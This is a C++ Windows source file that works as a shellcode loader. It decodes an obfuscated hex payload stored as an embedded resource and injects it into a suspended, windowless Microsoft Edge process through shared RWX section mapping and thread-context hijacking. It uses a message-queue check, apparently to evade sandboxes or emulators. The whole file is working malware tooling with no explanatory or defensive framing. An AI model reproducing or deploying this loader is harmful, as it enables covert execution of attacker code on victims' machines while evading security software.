#include <Windows.h>
#include <string>
#include <vector>

#include "Native.h"
#include "resource.h"

std::string resource()
{
    HRSRC hRsrc = NULL;
    hRsrc = FindResource(
        NULL,
        MAKEINTRESOURCE(IDR_RCDATA1),
        RT_RCDATA);

    HGLOBAL hGlobal = NULL;
    hGlobal = LoadResource(NULL, hRsrc);

    PVOID ptr = NULL;
    ptr = LockResource(hGlobal);

    SIZE_T size = NULL;
    size = SizeofResource(NULL, hRsrc);

    std::string result(reinterpret_cast<const char*>(ptr), size);
    return result;
}

std::vector<BYTE> decode(const std::string& hex) {
    std::vector<BYTE> shellcode;
    for (size_t i = 0; i < hex.length(); i += 2) {
        std::string hex_byte = hex.substr(i, 2);
        
        // Replace g-p with hexadecimal digits 0-9
        for (char& c : hex_byte)
            if (c >= 'g' && c <= 'p')
                c = '0' + (c - 'g');
        
        BYTE byte = std::stoi(hex_byte, nullptr, 16);
        shellcode.push_back(byte);
    }
    return shellcode;
}

void inject()
{
    LPSTARTUPINFOW startup_info = new STARTUPINFOW();
    startup_info->cb = sizeof(STARTUPINFOW);
    startup_info->dwFlags = STARTF_USESHOWWINDOW;

    PPROCESS_INFORMATION process_info = new PROCESS_INFORMATION();

    wchar_t cmd[] = L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\0";
    BOOL success = CreateProcess(
        NULL,
        cmd,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW | CREATE_SUSPENDED,
        NULL,
        NULL,
        startup_info,
        process_info
    );

    std::string hex = resource();
    std::vector<BYTE> shellcode = decode(hex);

    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    NtCreateSection ntCreateSection = (NtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    NtMapViewOfSection ntMapViewOfSection = (NtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    NtUnmapViewOfSection ntUnmapViewOfSection = (NtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");

    HANDLE hSection;
    LARGE_INTEGER szSection = { shellcode.size() };
    NTSTATUS status = ntCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        &szSection,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
        NULL
    );

    PVOID hLocalAddress = NULL;
    SIZE_T viewSize = 0;
    status = ntMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        &hLocalAddress,
        NULL,
        NULL,
        NULL,
        &viewSize,
        ViewShare,
        NULL,
        PAGE_EXECUTE_READWRITE
    );

    RtlCopyMemory(hLocalAddress, &shellcode[0], shellcode.size());

    PVOID hRemoteAddress = NULL;
    status = ntMapViewOfSection(
        hSection,
        process_info->hProcess,
        &hRemoteAddress,
        NULL,
        NULL,
        NULL,
        &viewSize,
        ViewShare,
        NULL,
        PAGE_EXECUTE_READWRITE
    );

    LPCONTEXT pContext = new CONTEXT();
    pContext->ContextFlags = CONTEXT_INTEGER;
    GetThreadContext(process_info->hThread, pContext);

    pContext->Rcx = (DWORD64)hRemoteAddress;
    SetThreadContext(process_info->hThread, pContext);

    ResumeThread(process_info->hThread);

    status = ntUnmapViewOfSection(
        GetCurrentProcess(),
        hLocalAddress
    );
}

void start()
{
    MSG msg;
    PostThreadMessage(GetCurrentThreadId(), WM_USER + 2, 23, 42);
    if (!PeekMessage(&msg, (HWND)-1, 0, 0, 0))
        return;

    if (msg.message != WM_USER + 2 || msg.wParam != 23 || msg.lParam != 42)
        return;

    inject();
}